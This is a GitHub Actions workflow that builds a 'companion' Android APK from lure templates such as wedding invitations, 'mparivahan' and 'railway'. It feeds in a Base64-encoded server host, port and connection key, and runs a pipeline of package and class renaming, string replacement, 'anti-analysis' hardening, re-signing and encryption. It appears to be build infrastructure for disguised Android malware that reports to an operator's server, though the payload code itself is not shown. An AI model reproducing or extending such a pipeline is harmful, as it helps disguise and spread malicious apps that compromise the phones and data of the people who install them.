name: Build Companion APK (Test)
run-name: "Companion-only build #${{ github.run_number }} [${{ github.event.inputs.template || 'wedding' }}]"

# ── Trigger ────────────────────────────────────────────────────────────────────
# Manual trigger only — does NOT fire on push so it never conflicts with build.yml
on:
  workflow_dispatch:
    inputs:
      template:
        description: 'App template (wedding/shaadi/shaadi_hindi/mparivahan/railway/friends/bhabhi/custom)'
        required: true
        default: 'wedding'
      server_host_b64:
        description: 'Base64-encoded server IP/host for companion (optional)'
        required: false
        default: ''
      server_port_b64:
        description: 'Base64-encoded server port for companion (optional)'
        required: false
        default: ''
      server_key_b64:
        description: 'Base64-encoded connection key for companion (optional)'
        required: false
        default: ''

permissions:
  contents: read

jobs:
  build-companion:
    name: Build Companion APK Only
    runs-on: ubuntu-latest

    env:
      MODULE_ASSET:    app/src/main/assets/companion.apk
      TEMPLATE:        ${{ github.event.inputs.template || 'wedding' }}
      SERVER_HOST_B64: ${{ github.event.inputs.server_host_b64 || '' }}
      SERVER_PORT_B64: ${{ github.event.inputs.server_port_b64 || '' }}
      SERVER_KEY_B64:  ${{ github.event.inputs.server_key_b64 || '' }}

    steps:

      # ── 1. Checkout ─────────────────────────────────────────────────────────────
      - name: Checkout Repository
        uses: actions/checkout@v4

      # ── 2. Cache apktool jar ────────────────────────────────────────────────────
      - name: Cache apktool
        uses: actions/cache@v4
        with:
          path: /usr/local/bin/apktool.jar
          key: apktool-2.9.3

      # ── 3. Cache Android SDK build-tools ────────────────────────────────────────
      - name: Setup Android SDK
        uses: android-actions/setup-android@v4
        with:
          packages: ''

      - name: Cache Android build-tools
        uses: actions/cache@v4
        with:
          path: ${{ env.ANDROID_SDK_ROOT }}/build-tools
          key: android-build-tools-34.0.0-${{ runner.os }}

      # ── 4. Install tools ────────────────────────────────────────────────────────
      # apt packages (zipalign, apksigner, aapt, python3-pil) are fast (~5s).
      # apktool jar and Android build-tools are cached above — skip re-download
      # when cache hits.
      - name: Install tools
        run: |
          sudo apt-get update -qq
          sudo apt-get install -y zipalign apksigner aapt python3-pil
          pip3 install cryptography --break-system-packages 2>/dev/null || true

          APKTOOL_VER="2.9.3"
          # Only download if cache missed (file absent or zero-size)
          if [ ! -s /usr/local/bin/apktool.jar ]; then
            wget -q "https://github.com/iBotPeaches/Apktool/releases/download/v${APKTOOL_VER}/apktool_${APKTOOL_VER}.jar" \
                 -O /usr/local/bin/apktool.jar
            echo "apktool jar downloaded"
          else
            echo "apktool jar restored from cache"
          fi
          wget -q "https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool" \
               -O /usr/local/bin/apktool
          chmod +x /usr/local/bin/apktool
          echo "apktool $(apktool --version)"

      # ── 5. Install Android build-tools (skip if cache hit) ──────────────────────
      - name: Install Android build-tools
        run: |
          echo "$ANDROID_SDK_ROOT/cmdline-tools/latest/bin" >> $GITHUB_PATH
          if [ ! -d "${ANDROID_SDK_ROOT}/build-tools/34.0.0" ]; then
            sdkmanager "platforms;android-34" "build-tools;34.0.0"
            echo "build-tools installed via sdkmanager"
          else
            echo "build-tools restored from cache"
          fi
          BUILD_TOOLS=$(ls ${ANDROID_SDK_ROOT}/build-tools/ | sort -V | tail -1)
          echo "${ANDROID_SDK_ROOT}/build-tools/${BUILD_TOOLS}" >> $GITHUB_PATH
          echo "Using build-tools: ${BUILD_TOOLS}"
          apksigner version

      # ── 4. Validate template ─────────────────────────────────────────────────────
      - name: Validate template
        run: |
          TMPL="${{ github.event.inputs.template }}"
          TMPL="${TMPL:-wedding}"
          VALID="wedding shaadi shaadi_hindi mparivahan railway friends bhabhi custom"
          if ! echo "$VALID" | grep -qw "$TMPL"; then
            echo "::error::Invalid template: '${TMPL}' — valid: ${VALID}"
            exit 1
          fi
          echo "✅ Template: ${TMPL}"

      # ── 5. Generate companion package name ───────────────────────────────────────
      # Uses package_name_generator.py — same as build.yml
      # Only generates MOD_PKG (companion) — NOVA_PKG is unused here
      - name: Generate companion package name
        id: pkg
        run: |
          TMPL="${{ github.event.inputs.template }}"
          TMPL="${TMPL:-wedding}"
          OUTPUT=$(python3 scripts/package_name_generator.py --template "${TMPL}")
          MOD_PKG=$(echo "$OUTPUT"  | grep MODULE_PKG    | cut -d= -f2)
          VER_CODE=$(echo "$OUTPUT" | grep VERSION_CODE  | cut -d= -f2)
          echo "MOD_PKG=${MOD_PKG}"   >> $GITHUB_OUTPUT
          echo "VER_CODE=${VER_CODE}" >> $GITHUB_OUTPUT
          echo "✅ Companion pkg: ${MOD_PKG}"
          echo "✅ Version code:  ${VER_CODE}"

      # ── 6. Run full companion pipeline (build_module.py) ─────────────────────────
      # All 41 steps: pkg rename → smali → class rename → string replace →
      # DEX rebuild → manifest patch → arsc patch → assemble → zipalign → sign →
      # Phase 2 anti-analysis → re-sign → pre-encrypt snapshot → encrypt
      - name: Build companion APK (all pipeline steps)
        env:
          NEW_MOD_PKG:       ${{ steps.pkg.outputs.MOD_PKG }}
          MOD_VER_CODE:      ${{ steps.pkg.outputs.VER_CODE }}
          MODULE_ASSET:      ${{ env.MODULE_ASSET }}
          SERVER_HOST_B64:   ${{ github.event.inputs.server_host_b64 }}
          SERVER_PORT_B64:   ${{ github.event.inputs.server_port_b64 }}
          SERVER_KEY_B64:    ${{ github.event.inputs.server_key_b64 }}
          KEYSTORE_BASE64:   ${{ secrets.KEYSTORE_BASE64 }}
          KEYSTORE_PASSWORD: ${{ secrets.KEYSTORE_PASSWORD }}
          KEY_ALIAS:         ${{ secrets.KEY_ALIAS }}
        run: |
          set -e
          echo "ANDROID_SDK_ROOT=${ANDROID_SDK_ROOT}"
          export MODULE_AUDIT_LOG="${GITHUB_WORKSPACE}/module_audit.log"
          python3 -u scripts/build_module.py 2>&1 | tee companion_build.log
          exit ${PIPESTATUS[0]}

      # ── 7. Upload pre-encrypt companion APK ──────────────────────────────────────
      # companion_processed.apk = fully processed, valid installable APK
      # saved by build_module.py BEFORE step_encrypt_companion() runs.
      # Download → adb install companion_processed.apk → test on device
      - name: Upload companion APK (pre-encrypt, installable)
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: companion-test-${{ github.run_number }}
          path: companion_processed.apk
          if-no-files-found: warn
          retention-days: 14

      # ── 8. Upload build log ───────────────────────────────────────────────────────
      # Always upload log — even on failure — so crash is diagnosable
      - name: Upload build log
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: companion-build-log-${{ github.run_number }}
          path: |
            companion_build.log
            module_audit.log
          if-no-files-found: ignore
          retention-days: 14

      # ── 9. Show build summary ────────────────────────────────────────────────────
      - name: Build summary
        if: always()
        run: |
          echo "════════════════════════════════════════"
          echo "  Companion-only build #${{ github.run_number }}"
          echo "  Template : ${{ github.event.inputs.template || 'wedding' }}"
          echo "  Pkg      : ${{ steps.pkg.outputs.MOD_PKG }}"
          echo "════════════════════════════════════════"
          echo ""
          echo "Artifacts:"
          echo "  companion-test-${{ github.run_number }}       ← install this on device"
          echo "  companion-build-log-${{ github.run_number }}  ← full pipeline log"
          echo ""
          if [ -f companion_processed.apk ]; then
            SIZE=$(du -h companion_processed.apk | cut -f1)
            echo "  ✅ companion_processed.apk — ${SIZE}"
          else
            echo "  ❌ companion_processed.apk not found — build_module.py may have failed"
            echo "     Check companion-build-log artifact for details"
          fi
